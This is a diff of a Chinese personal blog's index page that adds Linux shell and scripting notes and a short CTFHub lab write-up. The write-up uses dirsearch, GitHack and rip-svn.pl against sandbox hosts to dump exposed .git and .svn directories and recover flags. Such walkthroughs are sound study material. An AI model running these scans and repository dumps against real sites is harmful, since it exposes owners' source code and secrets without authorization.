@@ -7,7 +7,423 @@
     error: 'Copy error',
     noSupport: 'The browser does not support'
   }
-} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">108</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">17</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">18</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/06/01/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/">备份文件下载</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-06-01</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctfhub/">ctfhub</a></span><div class="content"><p>今天刷了ctfhub里的备份文件下载的四题，学到了一些东西，初步学会使用了dirsearch工具，这个东东我下在kali里了，在~/dirsearch里头使用命令：</p>
+} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">110</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">17</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">18</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/06/13/linux%E5%9F%BA%E7%A1%80/">linux基础</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-06-13</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/linux/">linux</a></span><div class="content"><h1 id="shell命令"><a href="#shell命令" class="headerlink" title="shell命令"></a>shell命令</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -F   &#x2F;&#x2F;更好显示格式</span><br><span class="line">ls -a   &#x2F;&#x2F;显示隐藏文件</span><br><span class="line">ls -l   &#x2F;&#x2F;查看文件各种选项</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat -n   &#x2F;&#x2F;显示行号</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep keyword des1 des2   &#x2F;&#x2F;在des1和des2里寻找keyword并且返回带有keyword的行</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F;dev -name filename -type d -print</span><br><span class="line">find &#x2F;dev -atime n  &#x2F;&#x2F;最后一次使用在n天前,+n表示大于n，-n表示小于n</span><br><span class="line">find &#x2F;dev -mtime n  &#x2F;&#x2F;最后一次修改在n天前</span><br></pre></td></tr></table></figure>
+
+<p>-type参数：</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>意义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>b</td>
+<td>块文件设备</td>
+</tr>
+<tr>
+<td>c</td>
+<td>字符设备文件</td>
+</tr>
+<tr>
+<td>d</td>
+<td>目录文件</td>
+</tr>
+<tr>
+<td>f</td>
+<td>普通文件</td>
+</tr>
+<tr>
+<td>p</td>
+<td>命名管道</td>
+</tr>
+<tr>
+<td>l</td>
+<td>符号链接</td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate xxx.doc   &#x2F;&#x2F;快速定位文件位置</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis find   &#x2F;&#x2F;查找程序</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">man find   &#x2F;&#x2F;寻求关于man的操作</span><br><span class="line">whatis find   &#x2F;&#x2F;寻求关于man的操作【简洁】</span><br><span class="line">apropos search   &#x2F;&#x2F;知道功能查找命令，比如像搜索东西时输入左边命令</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h1 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h1><h2 id="创建、移动、删除文件"><a href="#创建、移动、删除文件" class="headerlink" title="创建、移动、删除文件"></a>创建、移动、删除文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir</span><br><span class="line">mkdir -p ~&#x2F;abc&#x2F;999   &#x2F;&#x2F;-p使得可以创建子目录</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch hello   &#x2F;&#x2F;创建子文件</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mv -i   &#x2F;&#x2F;提示是否覆盖原文件</span><br><span class="line">mv -b   &#x2F;&#x2F;在原文件后加个~</span><br><span class="line">cp -i</span><br><span class="line">cp -b   &#x2F;&#x2F;与mv同理</span><br><span class="line">cp -r test&#x2F; ~&#x2F;Desktop&#x2F;   &#x2F;&#x2F;将test子目录里所有内容移入目标位置</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -i   &#x2F;&#x2F;有提示，安全点</span><br><span class="line">rm -r   &#x2F;&#x2F;递归删除子目录下所有内容</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chown abc:root hhh   &#x2F;&#x2F;将hhh文件的属主换为abc，属组换为root</span><br><span class="line">chown -R abc dir&#x2F;   &#x2F;&#x2F;将dir及其子目录下所有文件交给用户abc</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chgrp group hhh   &#x2F;&#x2F;将文件hhh的属组换为group</span><br></pre></td></tr></table></figure>
+
+<p>chmod：</p>
+<table>
+<thead>
+<tr>
+<th>u</th>
+<th>文件属主</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>g</td>
+<td>文件属组</td>
+</tr>
+<tr>
+<td>o</td>
+<td>其他人</td>
+</tr>
+<tr>
+<td>a</td>
+<td>所有人</td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x hhh   &#x2F;&#x2F;给hhh的文件属主增加执行权限</span><br><span class="line">chmod o&#x3D;r hhh   &#x2F;&#x2F;给其他人读hhh文件的权限</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>r</th>
+<th>4</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>w</td>
+<td>2</td>
+</tr>
+<tr>
+<td>x</td>
+<td>1</td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 761 hhh   &#x2F;&#x2F;给hhh赋予以下权限：属主rwx，属组rx，其他人x</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h2><table>
+<thead>
+<tr>
+<th>符号</th>
+<th>文件类型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>d</td>
+<td>目录</td>
+</tr>
+<tr>
+<td>c</td>
+<td>字符设备文件</td>
+</tr>
+<tr>
+<td>b</td>
+<td>块设备文件</td>
+</tr>
+<tr>
+<td>s</td>
+<td>本地域套接口</td>
+</tr>
+<tr>
+<td>p</td>
+<td>有名管道</td>
+</tr>
+<tr>
+<td>l</td>
+<td>符号链接</td>
+</tr>
+<tr>
+<td>-</td>
+<td>普通文件</td>
+</tr>
+</tbody></table>
+<p>字符设备文件（顺序访问设备）：指能从它那里读取成字符序列的设备。如磁带和串行线路。</p>
+<p>块设备（随机访问设备）：块设备指用来存储数据并对其各部分内容提供同等访问权的设备，如磁盘。</p>
+<h2 id="建立链接"><a href="#建立链接" class="headerlink" title="建立链接"></a>建立链接</h2><h3 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;share&#x2F; 123   &#x2F;&#x2F;建立一个指向&#x2F;usr&#x2F;local&#x2F;share&#x2F;的符号链接123</span><br></pre></td></tr></table></figure>
+
+<p>软链接中，如果删除被指向的文件，连接将失去作用，但如果删除指向文件【123】，被指向的文件并无任何影响。</p>
+<h3 id="硬链接"><a href="#硬链接" class="headerlink" title="硬链接"></a>硬链接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln &#x2F;usr&#x2F;local&#x2F;share&#x2F; 123    &#x2F;&#x2F;建立一个硬链接</span><br></pre></td></tr></table></figure>
+
+<p>对于硬链接，相当于两个完全相同的文件，当年改变其中一个文件时，另一个文件也会随之改变</p>
+<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">date &gt; date_out   &#x2F;&#x2F;&gt;会覆盖原date_out文件</span><br><span class="line">ls ~&#x2F; &gt;&gt; lsF   &#x2F;&#x2F;&gt;&gt;会把结果加在原来lsF文件最后</span><br></pre></td></tr></table></figure>
+
+<h3 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat   &#x2F;&#x2F;每次打印用户的键盘输入，直到用户ctrl C</span><br><span class="line">cat &lt; lsF   &#x2F;&#x2F;将lsF作为输入参数传递给cat</span><br><span class="line">cat &lt;&lt; EOF   &#x2F;&#x2F;每次打印用户的键盘输入，直到遇到参数EOF</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 | command2   &#x2F;&#x2F;将command1的输出作为command2的输入</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="shell编程"><a href="#shell编程" class="headerlink" title="shell编程"></a>shell编程</h1><h2 id="几种特殊变量"><a href="#几种特殊变量" class="headerlink" title="几种特殊变量"></a>几种特殊变量</h2><table>
+<thead>
+<tr>
+<th>变量</th>
+<th>意义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$0</td>
+<td>文件名</td>
+</tr>
+<tr>
+<td>$1</td>
+<td>第一个参数名</td>
+</tr>
+<tr>
+<td>$#</td>
+<td>参数个数</td>
+</tr>
+<tr>
+<td>$*/$@</td>
+<td>包含参数列表【所有参数】，可用for遍历</td>
+</tr>
+</tbody></table>
+<h2 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h2><table>
+<thead>
+<tr>
+<th>“”</th>
+<th>阻止shell对大多数shell字符解释【如#】，但仍解释$、`、“等’’</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>‘’</td>
+<td>阻止解释所有字符</td>
+</tr>
+<tr>
+<td>``</td>
+<td>执行倒引号内的命令</td>
+</tr>
+</tbody></table>
+<h2 id="几种控制语句"><a href="#几种控制语句" class="headerlink" title="几种控制语句"></a>几种控制语句</h2><h3 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if [ &quot;a&quot; &#x3D; &quot;b&quot; ]   &#x2F;&#x2F;空格！！！</span><br><span class="line">if test &quot;a&quot; &#x3D; &quot;b&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="比较方法"><a href="#比较方法" class="headerlink" title="比较方法"></a>比较方法</h3><h4 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h4><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-z str</td>
+<td>str长度为0返回真</td>
+</tr>
+<tr>
+<td>-n str</td>
+<td>str长度大于0返回真</td>
+</tr>
+<tr>
+<td>str1 = str2</td>
+<td>str1等于str2返回真</td>
+</tr>
+<tr>
+<td>str1 != str2</td>
+<td>str1不等于str2返回真</td>
+</tr>
+</tbody></table>
+<h4 id="文件比较"><a href="#文件比较" class="headerlink" title="文件比较"></a>文件比较</h4><p><img src="/2020/06/13/linux%E5%9F%BA%E7%A1%80/file.jpg" alt="file"></p>
+<h4 id="数字比较"><a href="#数字比较" class="headerlink" title="数字比较"></a>数字比较</h4><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-eq</td>
+<td>=</td>
+</tr>
+<tr>
+<td>-ne</td>
+<td>!=</td>
+</tr>
+<tr>
+<td>-lt</td>
+<td>&lt;</td>
+</tr>
+<tr>
+<td>-le</td>
+<td>&lt;=</td>
+</tr>
+<tr>
+<td>-gt</td>
+<td>&gt;</td>
+</tr>
+<tr>
+<td>-ge</td>
+<td>&gt;=</td>
+</tr>
+</tbody></table>
+<h4 id="复合表达式"><a href="#复合表达式" class="headerlink" title="复合表达式"></a>复合表达式</h4><table>
+<thead>
+<tr>
+<th>操作符</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>!expr</td>
+<td>非</td>
+</tr>
+<tr>
+<td>expr1 -a expr2</td>
+<td>与</td>
+</tr>
+<tr>
+<td>expr1 -o expr2</td>
+<td>或</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>-a在expr1为假时就不会判断expr2</p>
+<p>-o在expr1为真时就不会判断expr2</p>
+</blockquote>
+<h3 id="几个具体例子"><a href="#几个具体例子" class="headerlink" title="几个具体例子"></a>几个具体例子</h3><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if test-commands-1</span><br><span class="line">then</span><br><span class="line">	commands-1</span><br><span class="line">elif test-commands-2</span><br><span class="line">then</span><br><span class="line">	commands-2</span><br><span class="line">else</span><br><span class="line">	commands</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+
+<h4 id="case"><a href="#case" class="headerlink" title="case"></a>case</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">case word in</span><br><span class="line">	pattern-1)</span><br><span class="line">		command-1</span><br><span class="line">		;;</span><br><span class="line">	pattern-2)</span><br><span class="line">		command-2</span><br><span class="line">		;;</span><br><span class="line">	...</span><br><span class="line">	pattern-n)    &#x2F;&#x2F;此步可用*)来代替default</span><br><span class="line">		command-n</span><br><span class="line">		;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>
+
+<h4 id="while"><a href="#while" class="headerlink" title="while"></a>while</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while test-commands</span><br><span class="line">do</span><br><span class="line">	commands</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<h4 id="until-测试条件与while相反"><a href="#until-测试条件与while相反" class="headerlink" title="until[测试条件与while相反]"></a>until[测试条件与while相反]</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">until test-commands</span><br><span class="line">do</span><br><span class="line">	commands</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for variable [in list]</span><br><span class="line">do</span><br><span class="line">	commands</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="一些对shell编程有用的命令"><a href="#一些对shell编程有用的命令" class="headerlink" title="一些对shell编程有用的命令"></a>一些对shell编程有用的命令</h2><h3 id="cut"><a href="#cut" class="headerlink" title="cut"></a>cut</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cut -c3-6 abc.txt   &#x2F;&#x2F;截取每一行第3-6字符</span><br><span class="line">cut -d&quot; &quot; -f2 abc.txt   &#x2F;&#x2F;以&quot; &quot;为分隔符，提取每一行的第二个字段</span><br></pre></td></tr></table></figure>
+
+<h3 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">diff file1 file2</span><br><span class="line">3c3</span><br><span class="line">4</span><br><span class="line">&lt; you are good</span><br><span class="line">----------------</span><br><span class="line">&gt; you are not </span><br><span class="line">&gt; hhh</span><br><span class="line"></span><br><span class="line">表示file1和file2第三行不同，file1是you are good，file2是you are not，file2多出第四行hhh</span><br></pre></td></tr></table></figure>
+
+<h3 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort -r -k2 abc.txt   &#x2F;&#x2F;按照第2个字段排序，-r代表倒序</span><br></pre></td></tr></table></figure>
+
+<h3 id="uniq"><a href="#uniq" class="headerlink" title="uniq"></a>uniq</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort abc.txt | uniq</span><br></pre></td></tr></table></figure>
+
+<p>uniq命令对排序过的文档，对其中重复的行进行去除</p>
+<h3 id="tr"><a href="#tr" class="headerlink" title="tr"></a>tr</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tr &quot;ABH&quot; &quot;HCA&quot; &lt; abc.txt   &#x2F;&#x2F;将A转为H，将B转为C，将H转为A</span><br><span class="line">tr --delete &quot; &quot; &lt; abc.txt   &#x2F;&#x2F;删除所有空格</span><br></pre></td></tr></table></figure>
+
+<h3 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wc abc.txt</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-c</td>
+<td>显示字节数</td>
+</tr>
+<tr>
+<td>-l</td>
+<td>显示行数</td>
+</tr>
+<tr>
+<td>-w</td>
+<td>显示单词数</td>
+</tr>
+<tr>
+<td>-L</td>
+<td>显示最长一行长度</td>
+</tr>
+</tbody></table>
+<h3 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">expr substr &quot;Hello World&quot; 1 5   &#x2F;&#x2F;截取第一个字节到第五个字节[expr不能丢，substr是shell、内建运算符而不是程序]</span><br><span class="line">&gt;&gt;Hello</span><br></pre></td></tr></table></figure>
+
+<h3 id="seq"><a href="#seq" class="headerlink" title="seq"></a>seq</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">seq 9 -3 0   &#x2F;&#x2F;从9-0，步长为-3</span><br><span class="line">&gt;&gt;9</span><br><span class="line">&gt;&gt;6</span><br><span class="line">&gt;&gt;3</span><br><span class="line">&gt;&gt;0</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><ol>
+<li><pre><code>num1=1+2
+num2=$[ 1 + 2 ]
+echo $num1 $num2
+&gt;&gt; 1+2 3
+
+expr 1 + 2                     //空格不能少！！！
+&gt;&gt; 3
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2.</span><br></pre></td></tr></table></figure>
+8#26   //代表8进制的26
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3. 对变量第一次赋值时不需要$,引用它的时候就要加上$</span><br></pre></td></tr></table></figure>
+name=&quot;hhh&quot;
+echo &quot;I am $name&quot;
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">4. 赋值不要加空格，判断要加</span><br></pre></td></tr></table></figure>
+name=&quot;hhh&quot;   //赋值不要加
+if test &quot;$name&quot; = &quot;hhh&quot;   //判断要加空格
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">5. &amp;&amp;，||，-a，-o</span><br></pre></td></tr></table></figure>
+if [ expr1 ] &amp;&amp; [expr2]
+if [ expr1 -a expr2 ]</code></pre></li>
+</ol>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/06/02/git%E6%B3%84%E9%9C%B2/">泄露</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-06-02</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctfhub/">ctfhub</a></span><div class="content"><h1 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h1><h2 id="log"><a href="#log" class="headerlink" title="log"></a>log</h2><p>先还是dirsearch扫一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;dirsearch.py -u &quot;http:&#x2F;&#x2F;challenge-14f2f8d51098f12f.sandbox.ctfhub.com:10080&#x2F;&quot; -e *</span><br></pre></td></tr></table></figure>
+
+<p>然后githack克隆一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 GitHack.py http:&#x2F;&#x2F;challenge-885f3dc042d14377.sandbox.ctfhub.com:10080&#x2F;.git</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li>git log可以查看日志 就是看看历史版本中都干了些什么</li>
+<li>git reset –-hard 版本号    就可以回到指定的版本 </li>
+</ul>
+</blockquote>
+<p><img src="/2020/06/02/git%E6%B3%84%E9%9C%B2/1.png" alt="1"></p>
+<p>我们现在是在“remove flag”版本，而flag应该是在add flag版本，所以以下有两种办法</p>
+<ul>
+<li><p>转到add flag版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 081a3f042a3b19429a61</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>比对两者的区别</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff 081a</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+</li>
+</ul>
+<h2 id="stash"><a href="#stash" class="headerlink" title="stash"></a>stash</h2><p>关于<a href="https://jingyan.baidu.com/article/49ad8bceacac6b5834d8fa9a.html" target="_blank" rel="noopener">git stash</a></p>
+<p>前面几步都一样，直到Githack克隆到本地。</p>
+<p>然后用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pop</span><br></pre></td></tr></table></figure>
+
+<p>弹出堆栈里的flag</p>
+<h1 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h1><p>先用dirsearch扫描发现/.svn</p>
+<p>于是用dvcs-ripper里输入以下命令进行扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;rip-svn.pl -v -u http:&#x2F;&#x2F;challenge-4410f020906ef0d6.sandbox.ctfhub.com:10080&#x2F;.svn&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>扫描完输入命令【一定要有-a才能看到隐藏文件夹】</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al</span><br></pre></td></tr></table></figure>
+
+<p>进入pristine文件夹寻找得到flag</p>
+<h1 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h1><p>这个工具出了点问题等调试好补上！</p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/06/01/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/">备份文件下载</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-06-01</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctfhub/">ctfhub</a></span><div class="content"><p>今天刷了ctfhub里的备份文件下载的四题，学到了一些东西，初步学会使用了dirsearch工具，这个东东我下在kali里了，在~/dirsearch里头使用命令：</p>
